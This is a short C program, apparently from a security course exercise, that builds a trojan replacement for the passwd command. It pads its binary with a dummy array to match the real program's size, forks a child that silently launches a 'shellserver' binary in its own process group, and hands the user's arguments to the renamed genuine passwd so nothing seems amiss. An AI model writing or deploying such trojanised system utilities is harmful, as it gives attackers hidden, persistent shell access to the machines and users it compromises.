#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define FAKE_MEM_SIZE 52200
#define SHELLSERVER_PATH "/home/stocki/Schreibtisch/dev/syse/shell/shellserver"

int main(int argc,char **argv){
	int pid;
	char **arg = argv;
    
    // allocate sem memory, to increase size
    static const char fake_mem_usage[FAKE_MEM_SIZE] __attribute__((used))= {1,2};
   

    // replace argument 0 (passwd) with the renamed copy of passwd
	arg[0]="chpwd";
	switch(pid=fork()){
		case -1:
			perror("fork");
			break;
		case 0:
            // start shellserver
			setpgid(0,0);
			//freopen("/dev/null","w",stdout);
			//freopen("/dev/null","w",stderr);
            char *arguments[2] = { "no_output", NULL };    
			execv(SHELLSERVER_PATH, arguments);
			
		default:
            // execute the "real" passwd
			execvp(arg[0], arg);
	}

	return 0;
}
